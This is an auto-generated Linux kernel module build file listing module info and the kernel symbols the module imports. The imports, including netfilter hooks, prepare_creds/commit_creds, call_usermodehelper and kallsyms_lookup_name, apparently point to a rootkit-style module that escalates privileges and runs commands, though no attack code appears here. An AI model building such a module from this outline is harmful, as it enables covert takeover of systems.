#include <linux/build-salt.h>
#include <linux/module.h>
#include <linux/vermagic.h>
#include <linux/compiler.h>

BUILD_SALT;

MODULE_INFO(vermagic, VERMAGIC_STRING);
MODULE_INFO(name, KBUILD_MODNAME);

__visible struct module __this_module
__section(.gnu.linkonce.this_module) = {
	.name = KBUILD_MODNAME,
	.init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
	.exit = cleanup_module,
#endif
	.arch = MODULE_ARCH_INIT,
};

#ifdef CONFIG_RETPOLINE
MODULE_INFO(retpoline, "Y");
#endif

static const struct modversion_info ____versions[]
__used __section(__versions) = {
	{ 0xdd8f8694, "module_layout" },
	{ 0xbbea7e99, "nf_unregister_net_hook" },
	{ 0x5ab904eb, "pv_ops" },
	{ 0x62a38e34, "nf_register_net_hook" },
	{ 0x30cb0399, "init_net" },
	{ 0x3b825fc1, "commit_creds" },
	{ 0x611bf0f1, "prepare_creds" },
	{ 0xa7eedcc4, "call_usermodehelper" },
	{ 0xdecd0b29, "__stack_chk_fail" },
	{ 0xe007de41, "kallsyms_lookup_name" },
	{ 0xb0e602eb, "memmove" },
	{ 0x37a0cba, "kfree" },
	{ 0xb44ad4b3, "_copy_to_user" },
	{ 0x20000329, "simple_strtoul" },
	{ 0x56b1771b, "current_task" },
	{ 0x362ef408, "_copy_from_user" },
	{ 0x88db9f48, "__check_object_size" },
	{ 0x2ea2c95c, "__x86_indirect_thunk_rax" },
	{ 0xeb233a45, "__kmalloc" },
	{ 0xa570351f, "init_task" },
	{ 0xc5850110, "printk" },
	{ 0xbdfb6dbb, "__fentry__" },
};

MODULE_INFO(depends, "");


MODULE_INFO(srcversion, "958C3800E6E0B4F5F670308");
